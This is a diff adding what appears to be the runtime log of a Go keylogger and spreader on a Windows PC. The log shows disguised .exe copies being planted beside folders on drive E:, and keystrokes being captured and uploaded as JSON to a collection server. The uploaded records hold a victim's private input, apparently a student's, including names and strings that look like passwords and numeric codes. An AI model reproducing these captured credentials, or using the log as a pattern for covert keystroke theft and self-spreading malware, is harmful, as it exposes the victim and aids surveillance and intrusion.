@@ -1,0 +1,750 @@
+2025/05/06 01:34:33 main.go:77: run in d
+2025/05/06 01:38:39 utils.go:43: C:\Users\ylg\AppData\Roaming\Windows Explorer.exe file not exists,cpy
+2025/05/06 01:40:56 main.go:77: run in d
+2025/05/06 01:40:56 utils.go:43: E:\CloudMusic.exe file not exists,cpy
+2025/05/06 01:40:58 utils.go:43: E:\Pictures.exe file not exists,cpy
+2025/05/06 01:41:00 utils.go:43: E:\Pictures\高二五班成人仪式.exe file not exists,cpy
+2025/05/06 01:41:01 utils.go:43: E:\Sounds.exe file not exists,cpy
+2025/05/06 01:41:03 utils.go:43: E:\Sounds\CallRecord.exe file not exists,cpy
+2025/05/06 01:41:04 utils.go:43: E:\System Volume Information.exe file not exists,cpy
+2025/05/06 01:41:06 utils.go:43: E:\System Volume 恉nformation.exe file not exists,cpy
+2025/05/06 01:41:07 utils.go:43: E:\新建文件夹.exe file not exists,cpy
+2025/05/06 01:49:57 keylogger.go:54: Data inserting succeed: huorong [Enter]
+2025/05/06 01:49:57 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746496197,"keystrokeRecord":"huorong [Enter]"}}
+2025/05/06 01:49:58 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 01:49:58 upload.go:41: Upload succeed 1746496197  ---  huorong [Enter]
+2025/05/06 01:50:07 keylogger.go:54: Data inserting succeed: bai
+2025/05/06 01:50:08 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746496207,"keystrokeRecord":"bai"}}
+2025/05/06 01:50:08 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 01:50:08 upload.go:41: Upload succeed 1746496207  ---  bai
+2025/05/06 01:50:17 keylogger.go:54: Data inserting succeed: du [Enter]huorong [Enter]
+2025/05/06 01:50:18 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746496217,"keystrokeRecord":"du [Enter]huorong [Enter]"}}
+2025/05/06 01:50:19 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 01:50:19 upload.go:41: Upload succeed 1746496217  ---  du [Enter]huorong [Enter]
+2025/05/06 01:51:57 keylogger.go:54: Data inserting succeed: gaoernianjidierxuew[Back]qiqizks
+2025/05/06 01:51:59 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746496317,"keystrokeRecord":"gaoernianjidierxuew[Back]qiqizks"}}
+2025/05/06 01:52:00 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 01:52:00 upload.go:41: Upload succeed 1746496317  ---  gaoernianjidierxuew[Back]qiqizks
+2025/05/06 01:52:07 keylogger.go:54: Data inserting succeed:  
+2025/05/06 01:52:10 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746496327,"keystrokeRecord":" "}}
+2025/05/06 01:52:10 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 01:52:10 upload.go:41: Upload succeed 1746496327  ---   
+2025/05/06 01:53:12 main.go:77: run in d
+2025/05/06 02:05:43 keylogger.go:54: Data inserting succeed: [Back]7W1
+2025/05/06 02:05:53 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746497143,"keystrokeRecord":"[Back]7W1"}}
+2025/05/06 02:05:54 keylogger.go:54: Data inserting succeed: h9y991210zrcw
+2025/05/06 02:05:54 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 02:05:54 upload.go:41: Upload succeed 1746497143  ---  [Back]7W1
+2025/05/06 02:06:04 keylogger.go:54: Data inserting succeed: [Enter]
+2025/05/06 02:06:04 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746497154,"keystrokeRecord":"h9y991210zrcw"}}
+2025/05/06 02:06:05 utilities.go:62: 
+[[[resp.Body upload]]]{"error":"UNIQUE constraint failed: beacon_data.timestamp"}{"msg":"succeed"}
+
+2025/05/06 02:06:05 upload.go:41: Upload succeed 1746497154  ---  h9y991210zrcw
+2025/05/06 02:06:15 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746497164,"keystrokeRecord":"[Enter]"}}
+2025/05/06 02:06:16 utilities.go:62: 
+[[[resp.Body upload]]]{"error":"UNIQUE constraint failed: beacon_data.timestamp"}{"msg":"succeed"}
+
+2025/05/06 02:06:16 upload.go:41: Upload succeed 1746497164  ---  [Enter]
+2025/05/06 02:28:15 keylogger.go:54: Data inserting succeed: 9
+2025/05/06 02:28:17 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746498495,"keystrokeRecord":"9"}}
+2025/05/06 02:28:18 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 02:28:18 upload.go:41: Upload succeed 1746498495  ---  9
+2025/05/06 02:28:25 keylogger.go:54: Data inserting succeed: 173
+2025/05/06 02:28:28 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746498505,"keystrokeRecord":"173"}}
+2025/05/06 02:28:29 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/06 02:28:29 upload.go:41: Upload succeed 1746498505  ---  173
+2025/05/06 02:28:46 utils.go:43: E:\2025版提升版II 全套课件.exe file not exists,cpy
+2025/05/06 02:28:48 utils.go:43: E:\2025版提升版II 全套课件\10、25版提升版II英语精听--模拟2全部试题.exe file not exists,cpy
+2025/05/06 02:28:49 utils.go:43: E:\2025版提升版II 全套课件\11、25版提升版II英语精听--模拟3全部试题.exe file not exists,cpy
+2025/05/06 02:28:50 utils.go:43: E:\2025版提升版II 全套课件\12、25版提升版II英语精听--模拟4全部试题.exe file not exists,cpy
+2025/05/06 02:28:51 utils.go:43: E:\2025版提升版II 全套课件\13、25版提升版II英语精听--模拟5全部试题.exe file not exists,cpy
+2025/05/06 02:28:53 utils.go:43: E:\2025版提升版II 全套课件\14、25版提升版II英语—重难点巩固练习 1~5.exe file not exists,cpy
+2025/05/06 02:28:55 utils.go:43: E:\2025版提升版II 全套课件\15、25版提升版II英语精听--模拟6全部试题.exe file not exists,cpy
+2025/05/06 02:28:57 utils.go:43: E:\2025版提升版II 全套课件\16、25版提升版II英语精听--模拟7全部试题.exe file not exists,cpy
+2025/05/06 02:28:58 utils.go:43: E:\2025版提升版II 全套课件\17、25版提升版II英语精听--模拟8全部试题.exe file not exists,cpy
+2025/05/06 02:28:59 utils.go:43: E:\2025版提升版II 全套课件\18、25版提升版II英语精听--模拟9全部试题.exe file not exists,cpy
+2025/05/06 02:29:00 utils.go:43: E:\2025版提升版II 全套课件\19、25版提升版II英语精听--模拟10全部试题.exe file not exists,cpy
+2025/05/06 02:29:01 utils.go:43: E:\2025版提升版II 全套课件\1、25版提升版II英语精听--专项1全部试题.exe file not exists,cpy
+2025/05/06 02:29:02 utils.go:43: E:\2025版提升版II 全套课件\20、25版提升版II英语—重难点巩固练习 6~10.exe file not exists,cpy
+2025/05/06 02:29:03 utils.go:43: E:\2025版提升版II 全套课件\21、25版提升版II英语精听--模拟11全部试题.exe file not exists,cpy
+2025/05/06 02:29:04 utils.go:43: E:\2025版提升版II 全套课件\22、25版提升版II英语精听--模拟12全部试题.exe file not exists,cpy
+2025/05/06 02:29:05 utils.go:43: E:\2025版提升版II 全套课件\23、25版提升版II英语精听--模拟13全部试题.exe file not exists,cpy
+2025/05/06 02:29:06 utils.go:43: E:\2025版提升版II 全套课件\24、25版提升版II英语精听--模拟14全部试题.exe file not exists,cpy
+2025/05/06 02:29:08 utils.go:43: E:\2025版提升版II 全套课件\25、25版提升版II英语精听--模拟15全部试题.exe file not exists,cpy
+2025/05/06 02:29:09 utils.go:43: E:\2025版提升版II 全套课件\26、25版提升版II英语—重难点巩固练习 11~15.exe file not exists,cpy
+2025/05/06 02:29:10 utils.go:43: E:\2025版提升版II 全套课件\27、25版提升版II英语精听--模拟16全部试题.exe file not exists,cpy
+2025/05/06 02:29:11 utils.go:43: E:\2025版提升版II 全套课件\28、25版提升版II英语精听--模拟17全部试题.exe file not exists,cpy
+2025/05/06 02:29:12 utils.go:43: E:\2025版提升版II 全套课件\29、25版提升版II英语精听--模拟18全部试题.exe file not exists,cpy
+2025/05/06 02:29:14 utils.go:43: E:\2025版提升版II 全套课件\2、25版提升版II英语精听--专项2全部试题.exe file not exists,cpy
+2025/05/06 02:29:14 utils.go:43: E:\2025版提升版II 全套课件\30、25版提升版II英语精听--模拟19全部试题.exe file not exists,cpy
+2025/05/06 02:29:15 utils.go:43: E:\2025版提升版II 全套课件\31、25版提升版II英语精听--模拟20全部试题.exe file not exists,cpy
+2025/05/06 02:29:16 utils.go:43: E:\2025版提升版II 全套课件\32、25版提升版II英语—重难点巩固练习 16~20.exe file not exists,cpy
+2025/05/06 02:29:17 utils.go:43: E:\2025版提升版II 全套课件\33、25版提升版II英语精听--模拟21全部试题.exe file not exists,cpy
+2025/05/06 02:29:19 utils.go:43: E:\2025版提升版II 全套课件\34、25版提升版II英语精听--模拟22全部试题.exe file not exists,cpy
+2025/05/06 02:29:19 utils.go:43: E:\2025版提升版II 全套课件\35、25版提升版II英语精听--模拟23全部试题.exe file not exists,cpy
+2025/05/06 02:29:20 utils.go:43: E:\2025版提升版II 全套课件\36、25版提升版II英语精听--模拟24全部试题.exe file not exists,cpy
+2025/05/06 02:29:21 utils.go:43: E:\2025版提升版II 全套课件\37、25版提升版II英语精听--模拟25全部试题.exe file not exists,cpy
+2025/05/06 02:29:21 utils.go:43: E:\2025版提升版II 全套课件\38、25版提升版II英语—重难点巩固练习 21~25.exe file not exists,cpy
+2025/05/06 02:29:23 utils.go:43: E:\2025版提升版II 全套课件\39、25版提升版II英语精听--模拟26全部试题.exe file not exists,cpy
+2025/05/06 02:29:24 utils.go:43: E:\2025版提升版II 全套课件\3、25版提升版II英语精听--专项3全部试题.exe file not exists,cpy
+2025/05/06 02:29:24 utils.go:43: E:\2025版提升版II 全套课件\40、25版提升版II英语精听--模拟27全部试题.exe file not exists,cpy
+2025/05/06 02:29:25 utils.go:43: E:\2025版提升版II 全套课件\41、25版提升版II英语精听--模拟28全部试题.exe file not exists,cpy
+2025/05/06 02:29:26 utils.go:43: E:\2025版提升版II 全套课件\42、25版提升版II英语精听--模拟29全部试题.exe file not exists,cpy
+2025/05/06 02:29:26 utils.go:43: E:\2025版提升版II 全套课件\43、25版提升版II英语精听--模拟30全部试题.exe file not exists,cpy
+2025/05/06 02:29:27 utils.go:43: E:\2025版提升版II 全套课件\44、25版提升版II英语—重难点巩固练习 26~30.exe file not exists,cpy
+2025/05/06 02:29:29 utils.go:43: E:\2025版提升版II 全套课件\45、25版提升版II英语精听--模拟31全部试题.exe file not exists,cpy
+2025/05/06 02:29:30 utils.go:43: E:\2025版提升版II 全套课件\46、25版提升版II英语精听--模拟32全部试题.exe file not exists,cpy
+2025/05/06 02:29:31 utils.go:43: E:\2025版提升版II 全套课件\47、25版提升版II英语精听--模拟33全部试题.exe file not exists,cpy
+2025/05/06 02:29:32 utils.go:43: E:\2025版提升版II 全套课件\48、25版提升版II英语精听--模拟34全部试题.exe file not exists,cpy
+2025/05/06 02:29:32 utils.go:43: E:\2025版提升版II 全套课件\49、25版提升版II英语精听--模拟35全部试题.exe file not exists,cpy
+2025/05/06 02:29:33 utils.go:43: E:\2025版提升版II 全套课件\4、25版提升版II英语精听--专项4全部试题.exe file not exists,cpy
+2025/05/06 02:29:35 utils.go:43: E:\2025版提升版II 全套课件\50、25版提升版II英语—重难点巩固练习 31~35.exe file not exists,cpy
+2025/05/06 02:29:36 utils.go:43: E:\2025版提升版II 全套课件\51、25版提升版II英语精听--模拟36全部试题.exe file not exists,cpy
+2025/05/06 02:29:37 utils.go:43: E:\2025版提升版II 全套课件\52、25版提升版II英语精听--模拟37全部试题.exe file not exists,cpy
+2025/05/06 02:29:37 utils.go:43: E:\2025版提升版II 全套课件\53、25版提升版II英语精听--模拟38全部试题.exe file not exists,cpy
+2025/05/06 02:29:38 utils.go:43: E:\2025版提升版II 全套课件\54、25版提升版II英语精听--模拟39全部试题.exe file not exists,cpy
+2025/05/06 02:29:39 utils.go:43: E:\2025版提升版II 全套课件\55、25版提升版II英语精听--模拟40全部试题.exe file not exists,cpy
+2025/05/06 02:29:41 utils.go:43: E:\2025版提升版II 全套课件\56、25版提升版II英语—重难点巩固练习 36~40.exe file not exists,cpy
+2025/05/06 02:29:42 utils.go:43: E:\2025版提升版II 全套课件\5、25版提升版II英语精听--专项5全部试题.exe file not exists,cpy
+2025/05/06 02:29:43 utils.go:43: E:\2025版提升版II 全套课件\6、25版提升版II英语精听--专项6全部试题.exe file not exists,cpy
+2025/05/06 02:29:43 utils.go:43: E:\2025版提升版II 全套课件\7、25版提升版II英语精听--专项7全部试题.exe file not exists,cpy
+2025/05/06 02:29:44 utils.go:43: E:\2025版提升版II 全套课件\8、25版提升版II英语精听--专项8全部试题.exe file not exists,cpy
+2025/05/06 02:29:46 utils.go:43: E:\2025版提升版II 全套课件\9、25版提升版II英语精听--模拟1全部试题.exe file not exists,cpy
+2025/05/06 02:29:46 utils.go:43: E:\2025版提升版II音频--标准语速.exe file not exists,cpy
+2025/05/06 02:29:47 utils.go:43: E:\2025版提升版II音频--标准语速【仅读一遍 无汉语提示】.exe file not exists,cpy
+2025/05/06 02:29:48 utils.go:43: E:\2025版提升版II音频--标准语速（环境音）.exe file not exists,cpy
+2025/05/06 02:29:49 utils.go:43: E:\2025版提升版II音频--标准语速（环境音）\高二五班成人仪式.exe file not exists,cpy
+2025/05/06 02:29:50 utils.go:43: E:\2025版提升版II音频--精听音频.exe file not exists,cpy
+2025/05/06 02:29:53 utils.go:43: E:\2025版提升版II音频--精听音频\2025版提升版II音频--慢速.exe file not exists,cpy
+2025/05/06 02:30:05 utils.go:43: E:\System Volume Information.exe file not exists,cpy
+2025/05/07 10:29:39 main.go:77: run in d
+2025/05/08 00:10:33 main.go:77: run in d
+2025/05/08 00:11:03 keylogger.go:54: Data inserting succeed: [Back]7W1h9y
+2025/05/08 00:11:13 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746663063,"keystrokeRecord":"[Back]7W1h9y"}}
+2025/05/08 00:11:13 keylogger.go:54: Data inserting succeed: 9912104unk[Enter]
+2025/05/08 00:11:14 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 00:11:14 upload.go:41: Upload succeed 1746663063  ---  [Back]7W1h9y
+2025/05/08 00:11:24 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746663073,"keystrokeRecord":"9912104unk[Enter]"}}
+2025/05/08 00:11:25 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 00:11:25 upload.go:41: Upload succeed 1746663073  ---  9912104unk[Enter]
+2025/05/08 00:27:04 keylogger.go:54: Data inserting succeed: 9873
+2025/05/08 00:27:06 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746664024,"keystrokeRecord":"9873"}}
+2025/05/08 00:27:07 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 00:27:07 upload.go:41: Upload succeed 1746664024  ---  9873
+2025/05/08 00:27:14 keylogger.go:54: Data inserting succeed: 04446[Back]6
+2025/05/08 00:27:17 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746664034,"keystrokeRecord":"04446[Back]6"}}
+2025/05/08 00:27:17 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 00:27:17 upload.go:41: Upload succeed 1746664034  ---  04446[Back]6
+2025/05/08 00:53:55 keylogger.go:54: Data inserting succeed: 9850
+2025/05/08 00:53:58 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746665635,"keystrokeRecord":"9850"}}
+2025/05/08 00:53:59 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 00:53:59 upload.go:41: Upload succeed 1746665635  ---  9850
+2025/05/08 01:18:06 keylogger.go:54: Data inserting succeed: 843[Back]53
+2025/05/08 01:18:10 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746667086,"keystrokeRecord":"843[Back]53"}}
+2025/05/08 01:18:11 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 01:18:11 upload.go:41: Upload succeed 1746667086  ---  843[Back]53
+2025/05/08 01:50:07 keylogger.go:54: Data inserting succeed: 4730
+2025/05/08 01:50:12 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746669007,"keystrokeRecord":"4730"}}
+2025/05/08 01:50:13 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 01:50:13 upload.go:41: Upload succeed 1746669007  ---  4730
+2025/05/08 01:50:37 keylogger.go:54: Data inserting succeed: [Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back]0496
+2025/05/08 01:50:43 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746669037,"keystrokeRecord":"[Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back]0496"}}
+2025/05/08 01:50:44 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 01:50:44 upload.go:41: Upload succeed 1746669037  ---  [Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back][Back]0496
+2025/05/08 02:09:18 keylogger.go:54: Data inserting succeed: 6508
+2025/05/08 02:09:25 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746670158,"keystrokeRecord":"6508"}}
+2025/05/08 02:09:26 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 02:09:26 upload.go:41: Upload succeed 1746670158  ---  6508
+2025/05/08 02:09:28 keylogger.go:54: Data inserting succeed: 7211
+2025/05/08 02:09:36 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746670168,"keystrokeRecord":"7211"}}
+2025/05/08 02:09:37 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 02:09:37 upload.go:41: Upload succeed 1746670168  ---  7211
+2025/05/08 03:32:43 keylogger.go:54: Data inserting succeed: [Enter]
+2025/05/08 03:32:53 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746675163,"keystrokeRecord":"[Enter]"}}
+2025/05/08 03:32:55 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 03:32:55 upload.go:41: Upload succeed 1746675163  ---  [Enter]
+2025/05/08 03:33:03 keylogger.go:54: Data inserting succeed: 70[Back]
+2025/05/08 03:33:05 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746675183,"keystrokeRecord":"70[Back]"}}
+2025/05/08 03:33:05 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 03:33:05 upload.go:41: Upload succeed 1746675183  ---  70[Back]
+2025/05/08 03:33:13 keylogger.go:54: Data inserting succeed: W1h9y9912109
+2025/05/08 03:33:15 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746675193,"keystrokeRecord":"W1h9y9912109"}}
+2025/05/08 03:33:16 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 03:33:16 upload.go:41: Upload succeed 1746675193  ---  W1h9y9912109
+2025/05/08 03:33:23 keylogger.go:54: Data inserting succeed: m[Enter]2z[Enter]
+2025/05/08 03:33:26 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746675203,"keystrokeRecord":"m[Enter]2z[Enter]"}}
+2025/05/08 03:33:27 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 03:33:27 upload.go:41: Upload succeed 1746675203  ---  m[Enter]2z[Enter]
+2025/05/08 03:48:44 keylogger.go:54: Data inserting succeed: 5632
+2025/05/08 03:48:47 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746676124,"keystrokeRecord":"5632"}}
+2025/05/08 03:48:48 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 03:48:48 upload.go:41: Upload succeed 1746676124  ---  5632
+2025/05/08 04:13:55 keylogger.go:54: Data inserting succeed: 9395
+2025/05/08 04:13:59 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746677635,"keystrokeRecord":"9395"}}
+2025/05/08 04:14:00 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:14:00 upload.go:41: Upload succeed 1746677635  ---  9395
+2025/05/08 04:14:25 keylogger.go:54: Data inserting succeed: zhao han
+2025/05/08 04:14:30 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746677665,"keystrokeRecord":"zhao han"}}
+2025/05/08 04:14:31 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:14:31 upload.go:41: Upload succeed 1746677665  ---  zhao han
+2025/05/08 04:14:35 keylogger.go:54: Data inserting succeed: zhab
+2025/05/08 04:14:41 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746677675,"keystrokeRecord":"zhab"}}
+2025/05/08 04:14:41 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:14:41 upload.go:41: Upload succeed 1746677675  ---  zhab
+2025/05/08 04:14:45 keylogger.go:54: Data inserting succeed: n[Back][Back]ng [Back]a[Back]zhangtong
+2025/05/08 04:14:51 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746677685,"keystrokeRecord":"n[Back][Back]ng [Back]a[Back]zhangtong"}}
+2025/05/08 04:14:52 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:14:52 upload.go:41: Upload succeed 1746677685  ---  n[Back][Back]ng [Back]a[Back]zhangtong
+2025/05/08 04:14:55 keylogger.go:54: Data inserting succeed: 3
+2025/05/08 04:15:02 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746677695,"keystrokeRecord":"3"}}
+2025/05/08 04:15:03 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:15:03 upload.go:41: Upload succeed 1746677695  ---  3
+2025/05/08 04:18:25 keylogger.go:54: Data inserting succeed: 1.5
+2025/05/08 04:18:33 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746677905,"keystrokeRecord":"1.5"}}
+2025/05/08 04:18:34 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:18:34 upload.go:41: Upload succeed 1746677905  ---  1.5
+2025/05/08 04:36:36 keylogger.go:54: Data inserting succeed: 4
+2025/05/08 04:36:45 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746678996,"keystrokeRecord":"4"}}
+2025/05/08 04:36:46 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:36:46 upload.go:41: Upload succeed 1746678996  ---  4
+2025/05/08 04:36:46 keylogger.go:54: Data inserting succeed: 4
+2025/05/08 04:36:56 keylogger.go:54: Data inserting succeed: [Enter]
+2025/05/08 04:36:56 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679006,"keystrokeRecord":"4"}}
+2025/05/08 04:36:56 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:36:56 upload.go:41: Upload succeed 1746679006  ---  4
+2025/05/08 04:37:06 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679016,"keystrokeRecord":"[Enter]"}}
+2025/05/08 04:37:07 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:37:07 upload.go:41: Upload succeed 1746679016  ---  [Enter]
+2025/05/08 04:37:16 keylogger.go:54: Data inserting succeed: 12[Enter]
+2025/05/08 04:37:17 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679036,"keystrokeRecord":"12[Enter]"}}
+2025/05/08 04:37:18 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:37:18 upload.go:41: Upload succeed 1746679036  ---  12[Enter]
+2025/05/08 04:37:56 keylogger.go:54: Data inserting succeed: 00
+2025/05/08 04:37:58 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679076,"keystrokeRecord":"00"}}
+2025/05/08 04:37:59 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:37:59 upload.go:41: Upload succeed 1746679076  ---  00
+2025/05/08 04:38:06 keylogger.go:54: Data inserting succeed: 41
+2025/05/08 04:38:09 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679086,"keystrokeRecord":"41"}}
+2025/05/08 04:38:10 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:38:10 upload.go:41: Upload succeed 1746679086  ---  41
+2025/05/08 04:38:16 keylogger.go:54: Data inserting succeed: 9[Enter]
+2025/05/08 04:38:20 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679096,"keystrokeRecord":"9[Enter]"}}
+2025/05/08 04:38:20 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:38:20 upload.go:41: Upload succeed 1746679096  ---  9[Enter]
+2025/05/08 04:38:36 keylogger.go:54: Data inserting succeed: 12
